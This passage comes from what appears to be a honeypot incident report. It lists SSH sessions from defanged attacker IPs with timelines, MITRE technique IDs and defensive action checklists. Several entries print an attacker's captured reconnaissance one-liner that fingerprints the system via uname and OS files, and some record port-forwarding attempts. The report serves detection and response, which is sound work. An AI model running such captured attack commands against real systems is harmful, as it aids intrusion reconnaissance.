**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:21:01` | `cowrie.session.connect` |
| `2026-08-16 10:21:01` | `cowrie.client.version` |
| `2026-08-16 10:21:01` | `cowrie.client.kex` |
| `2026-08-16 10:21:02` | `cowrie.login.success` |
| `2026-08-16 10:21:03` | `cowrie.session.params` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.success` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:03` | `cowrie.command.input` |
| `2026-08-16 10:21:04` | `cowrie.log.closed` |
| `2026-08-16 10:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7720598fb08c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 10:22 |
| **Last Seen** | 2026-08-16 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:22:06` | `cowrie.session.connect` |
| `2026-08-16 10:22:06` | `cowrie.client.version` |
| `2026-08-16 10:22:06` | `cowrie.client.kex` |
| `2026-08-16 10:22:06` | `cowrie.login.success` |
| `2026-08-16 10:22:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:22:06` | `cowrie.direct-tcpip.data` |
| `2026-08-16 10:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86962d98d43a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:22 |
| **Last Seen** | 2026-08-16 10:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:22:37` | `cowrie.session.connect` |
| `2026-08-16 10:22:37` | `cowrie.client.version` |
| `2026-08-16 10:22:37` | `cowrie.client.kex` |
| `2026-08-16 10:22:38` | `cowrie.login.success` |
| `2026-08-16 10:22:40` | `cowrie.session.params` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.success` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.command.input` |
| `2026-08-16 10:22:40` | `cowrie.log.closed` |
| `2026-08-16 10:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b82fd1bb6c3

| Field | Detail |
|---|---|
| **Source IP** | `124.133.10[.]66` |
| **First Seen** | 2026-08-16 10:24 |
| **Last Seen** | 2026-08-16 10:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:24:02` | `cowrie.session.connect` |
| `2026-08-16 10:24:03` | `cowrie.client.version` |
| `2026-08-16 10:24:03` | `cowrie.client.kex` |
| `2026-08-16 10:24:05` | `cowrie.login.success` |
| `2026-08-16 10:24:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.133.10[.]66` to AbuseIPDB if not already reported
- [ ] Block `124.133.10[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6225780376cd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:24 |
| **Last Seen** | 2026-08-16 10:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:24:12` | `cowrie.session.connect` |
| `2026-08-16 10:24:12` | `cowrie.client.version` |
| `2026-08-16 10:24:12` | `cowrie.client.kex` |
| `2026-08-16 10:24:13` | `cowrie.login.success` |
| `2026-08-16 10:24:15` | `cowrie.session.params` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.success` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.command.input` |
| `2026-08-16 10:24:15` | `cowrie.log.closed` |
| `2026-08-16 10:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44ca21e9f57

| Field | Detail |
|---|---|
| **Source IP** | `115.191.22[.]111` |
| **First Seen** | 2026-08-16 10:25 |
| **Last Seen** | 2026-08-16 10:30 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:25:08` | `cowrie.session.connect` |
| `2026-08-16 10:25:08` | `cowrie.client.version` |
| `2026-08-16 10:25:09` | `cowrie.client.kex` |
| `2026-08-16 10:25:10` | `cowrie.login.success` |
| `2026-08-16 10:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.22[.]111` to AbuseIPDB if not already reported
- [ ] Block `115.191.22[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d10736bf27b6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:25 |
| **Last Seen** | 2026-08-16 10:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:25:53` | `cowrie.session.connect` |
| `2026-08-16 10:25:53` | `cowrie.client.version` |
| `2026-08-16 10:25:53` | `cowrie.client.kex` |
| `2026-08-16 10:25:54` | `cowrie.login.success` |
| `2026-08-16 10:25:56` | `cowrie.session.params` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.success` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.command.input` |
| `2026-08-16 10:25:56` | `cowrie.log.closed` |
| `2026-08-16 10:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-919220f950da

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 10:27 |
| **Last Seen** | 2026-08-16 10:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:27:09` | `cowrie.session.connect` |
| `2026-08-16 10:27:09` | `cowrie.client.version` |
| `2026-08-16 10:27:10` | `cowrie.client.kex` |
| `2026-08-16 10:27:10` | `cowrie.login.success` |
| `2026-08-16 10:27:11` | `cowrie.session.params` |
| `2026-08-16 10:27:11` | `cowrie.command.input` |
| `2026-08-16 10:27:11` | `cowrie.log.closed` |
| `2026-08-16 10:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c97df2f18df8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:27 |
| **Last Seen** | 2026-08-16 10:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:27:34` | `cowrie.session.connect` |
| `2026-08-16 10:27:35` | `cowrie.client.version` |
| `2026-08-16 10:27:35` | `cowrie.client.kex` |
| `2026-08-16 10:27:35` | `cowrie.login.success` |
| `2026-08-16 10:27:36` | `cowrie.session.params` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.success` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.command.input` |
| `2026-08-16 10:27:36` | `cowrie.log.closed` |
| `2026-08-16 10:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30dc5c19c547

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:29 |
| **Last Seen** | 2026-08-16 10:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:29:19` | `cowrie.session.connect` |
| `2026-08-16 10:29:19` | `cowrie.client.version` |
| `2026-08-16 10:29:19` | `cowrie.client.kex` |
| `2026-08-16 10:29:19` | `cowrie.login.success` |
| `2026-08-16 10:29:21` | `cowrie.session.params` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.success` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.command.input` |
| `2026-08-16 10:29:21` | `cowrie.log.closed` |
| `2026-08-16 10:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5941c57927

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:31 |
| **Last Seen** | 2026-08-16 10:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:31:08` | `cowrie.session.connect` |
| `2026-08-16 10:31:08` | `cowrie.client.version` |
| `2026-08-16 10:31:08` | `cowrie.client.kex` |
| `2026-08-16 10:31:08` | `cowrie.login.success` |
| `2026-08-16 10:31:09` | `cowrie.session.params` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.success` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:09` | `cowrie.command.input` |
| `2026-08-16 10:31:10` | `cowrie.log.closed` |
| `2026-08-16 10:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eaa2885ce5a

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 10:31 |
| **Last Seen** | 2026-08-16 10:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:31:56` | `cowrie.session.connect` |
| `2026-08-16 10:31:56` | `cowrie.client.version` |
| `2026-08-16 10:31:56` | `cowrie.client.kex` |
| `2026-08-16 10:31:57` | `cowrie.login.success` |
| `2026-08-16 10:31:58` | `cowrie.session.params` |
| `2026-08-16 10:31:58` | `cowrie.command.input` |
| `2026-08-16 10:31:58` | `cowrie.log.closed` |
| `2026-08-16 10:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5affce331fdc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:32 |
| **Last Seen** | 2026-08-16 10:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:32:48` | `cowrie.session.connect` |
| `2026-08-16 10:32:49` | `cowrie.client.version` |
| `2026-08-16 10:32:49` | `cowrie.client.kex` |
| `2026-08-16 10:32:51` | `cowrie.login.success` |
| `2026-08-16 10:32:52` | `cowrie.session.params` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.success` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:52` | `cowrie.command.input` |
| `2026-08-16 10:32:53` | `cowrie.log.closed` |
| `2026-08-16 10:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfa2c6b86be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:34 |
| **Last Seen** | 2026-08-16 10:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:34:15` | `cowrie.session.connect` |
| `2026-08-16 10:34:15` | `cowrie.client.version` |
| `2026-08-16 10:34:15` | `cowrie.client.kex` |
| `2026-08-16 10:34:17` | `cowrie.login.success` |
| `2026-08-16 10:34:19` | `cowrie.session.params` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.success` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.command.input` |
| `2026-08-16 10:34:19` | `cowrie.log.closed` |
| `2026-08-16 10:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d723a17209a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:35 |
| **Last Seen** | 2026-08-16 10:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:35:42` | `cowrie.session.connect` |
| `2026-08-16 10:35:42` | `cowrie.client.version` |
| `2026-08-16 10:35:42` | `cowrie.client.kex` |
| `2026-08-16 10:35:44` | `cowrie.login.success` |
| `2026-08-16 10:35:45` | `cowrie.session.params` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.success` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.command.input` |
| `2026-08-16 10:35:45` | `cowrie.log.closed` |
| `2026-08-16 10:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-714b16eb03b8

| Field | Detail |
|---|---|
| **Source IP** | `175.43.162[.]226` |
| **First Seen** | 2026-08-16 10:36 |
| **Last Seen** | 2026-08-16 10:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:36:42` | `cowrie.session.connect` |
| `2026-08-16 10:36:43` | `cowrie.client.version` |
| `2026-08-16 10:36:43` | `cowrie.client.kex` |
| `2026-08-16 10:36:46` | `cowrie.login.success` |
